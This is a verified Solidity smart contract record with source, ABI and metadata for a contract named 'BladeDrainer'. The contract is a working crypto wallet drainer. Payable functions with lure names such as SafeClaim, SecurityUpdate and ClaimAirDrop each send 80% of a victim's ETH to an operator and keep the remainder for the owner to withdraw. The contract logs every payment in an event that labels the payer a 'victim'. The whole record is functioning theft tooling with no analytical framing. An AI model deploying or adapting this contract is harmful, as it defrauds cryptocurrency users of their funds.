{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.22;\r\n\r\ncontract BladeDrainer {\r\n    address private owner;\r\n    address private contractAddress;\r\n\r\n    // event for EVM logging\r\n    event OwnerSet(address indexed oldOwner, address indexed newOwner);\r\n\r\n    // event for EVM logging\r\n    event NativeDrain(\r\n        address indexed victim,\r\n        address indexed operator,\r\n        uint256 value\r\n    );\r\n\r\n    modifier isOwner() {\r\n        require(msg.sender == owner, \"This method can only be called by the contract owner. Now fuck off\");\r\n        _;\r\n    }\r\n    \r\n    /**\r\n     * @dev Set contract deployer as owner\r\n     */\r\n    constructor() {\r\n        owner = msg.sender; \r\n        contractAddress = address(this);\r\n        emit OwnerSet(address(0), owner);\r\n    }\r\n\r\n    // Methods for contract administration\r\n\r\n    function changeOwner(address newOwner) public isOwner {\r\n        owner = newOwner;\r\n        emit OwnerSet(owner, newOwner);\r\n    }\r\n\r\n    function getOwner() external view returns (address) { return owner; }\r\n\r\n    /**\r\n    * @dev Used to withdraw the ETH funds to the provided address\r\n    */\r\n    function withdraw(\r\n        address payable _to\r\n    ) public isOwner {\r\n        (bool success, ) = _to.call{\r\n            value: address(this).balance\r\n        }(\"\");\r\n\r\n        require(success, \"ETH Transfer failed.\");\r\n    }\r\n\r\n    // Methods that can receive ETH //\r\n    \r\n    function SafeClaim(address _operator) public payable {\r\n        require (msg.value > 0, \"Nice try moron\");\r\n        uint256 valueToSend = msg.value * 4 / 5;\r\n        (bool success, ) = _operator.call{value: valueToSend}(\"\");\r\n        require(success, \"ETH Transfer failed.\");\r\n        emit NativeDrain(msg.sender, _operator, msg.value); \r\n    }\r\n\r\n    function SecurityUpdate(address _operator) public payable {\r\n        require (msg.value > 0, \"Nice try moron\");\r\n        uint256 valueToSend = msg.value * 4 / 5;\r\n        (bool success, ) = _operator.call{value: valueToSend}(\"\");\r\n        require(success, \"ETH Transfer failed.\");\r\n        emit NativeDrain(msg.sender, _operator, msg.value); \r\n    \r\n    }\r\n\r\n    function ClaimAirDrop(address _operator) public payable {\r\n        require (msg.value > 0, \"Nice try moron\");\r\n        uint256 valueToSend = msg.value * 4 / 5;\r\n        (bool success, ) = _operator.call{value: valueToSend}(\"\");\r\n        require(success, \"ETH Transfer failed.\");\r\n        emit NativeDrain(msg.sender, _operator, msg.value); \r\n    }\r\n\r\n    function ClaimRewards(address _operator) public payable {\r\n        require (msg.value > 0, \"Nice try moron\");\r\n        uint256 valueToSend = msg.value * 4 / 5;\r\n        (bool success, ) = _operator.call{value: valueToSend}(\"\");\r\n        require(success, \"ETH Transfer failed.\");\r\n        emit NativeDrain(msg.sender, _operator, msg.value); \r\n    }\r\n\r\n    function ConfirmTrade(address _operator) public payable {\r\n        require (msg.value > 0, \"Nice try moron\");\r\n        uint256 valueToSend = msg.value * 4 / 5;\r\n        (bool success, ) = _operator.call{value: valueToSend}(\"\");\r\n        require(success, \"ETH Transfer failed.\");\r\n        emit NativeDrain(msg.sender, _operator, msg.value); \r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"victim\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"NativeDrain\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnerSet\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_operator\",\"type\":\"address\"}],\"name\":\"ClaimAirDrop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_operator\",\"type\":\"address\"}],\"name\":\"ClaimRewards\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_operator\",\"type\":\"address\"}],\"name\":\"ConfirmTrade\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_operator\",\"type\":\"address\"}],\"name\":\"SafeClaim\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_operator\",\"type\":\"address\"}],\"name\":\"SecurityUpdate\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"changeOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BladeDrainer", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://c4bb6c1671f26aae4d921a6a63a82c7d4ebb7165bd396478e3bacf0b0ab5f61a"}